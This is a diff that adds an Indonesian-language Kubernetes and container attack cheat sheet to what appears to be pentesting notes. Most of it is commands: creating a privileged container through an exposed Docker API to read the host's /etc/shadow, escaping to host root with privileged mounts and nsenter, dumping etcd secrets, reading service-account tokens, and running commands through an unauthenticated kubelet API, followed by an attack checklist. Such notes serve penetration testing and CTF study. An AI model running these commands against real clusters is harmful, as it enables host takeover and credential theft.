@@ -117,3 +117,78 @@ Persistence:
 - kube-bench — https://github.com/aquasecurity/kube-bench
 - HackTricks K8s — https://book.hacktricks.xyz/network-services-pentesting/kubernetes
 - Kubernetes Security (CKS) — https://kubernetes.io/docs/concepts/security/
+
+## Konkret — Container/K8s Exploit Payload (Testable)
+
+### Container Escape — runC (CVE-2019-5736)
+
+```bash
+# Payload di dalam container: overwrite /bin/sh di host via runC
+# 1. Cari PID runC di host
+# 2. Tulis payload ke /proc/<pid>/exe
+# 3. Tunggu admin exec ke container → runC di-overwrite
+
+# PoC:
+# libcontainer exploit → runtime ./runc --help
+# Setelah escape: host shell
+
+# Docker socket poisoning (sering di CTF)
+# Docker API exposed → create privileged container
+curl -X POST http://target:2375/containers/create -d '{
+  "Image": "alpine",
+  "Binds": ["/:/mnt"],
+  "Privileged": true,
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]
+}'
+```
+
+### Privileged Pod → Host Root
+
+```bash
+# Jika pod privileged: mount host filesystem
+kubectl exec -it pod -- /bin/sh
+# atau
+docker run -it --privileged -v /:/mnt alpine chroot /mnt
+
+# nsenter (PID 1 host)
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+```
+
+### etcd API — Cluster Takeover
+
+```bash
+# etcd exposed (biasanya port 2379, internal service)
+curl http://etcd:2379/version
+# Baca secrets/konfigurasi cluster
+curl http://etcd:2379/v3/kv/range -X POST -d '{"key": "L3NlY3JldHMv"}'
+
+# Service account token (untuk kubectl)
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+kubectl --token=<token> get pods -n kube-system
+```
+
+### kubelet API (Port 10250, tanpa auth)
+
+```bash
+# Kubelet read-only: cek pods & container
+curl http://node:10250/pods
+
+# Kubelet kubeletExec (RCE jika anonymous auth enabled)
+# CVE-2018-1002105 (kubectl exec proxy bypass)
+curl -X POST http://node:10250/run/namespace/pod/container -d 'cmd=id'
+```
+
+### K8s Attack Checklist
+
+1. Kubelet 10250 — `curl http://node:10250/pods`
+2. API server 6443 — cek anonymous/unauth
+3. etcd 2379 — secrets dump
+4. Service account token — apakah punya perms?
+5. Privileged pod — nsenter escape
+6. runC/CVE-2019-5736 — host binary overwrite
+7. Helm/charts — secrets in configmaps
+8. Network policies — apakah ada?
+---
+
+audited
+---
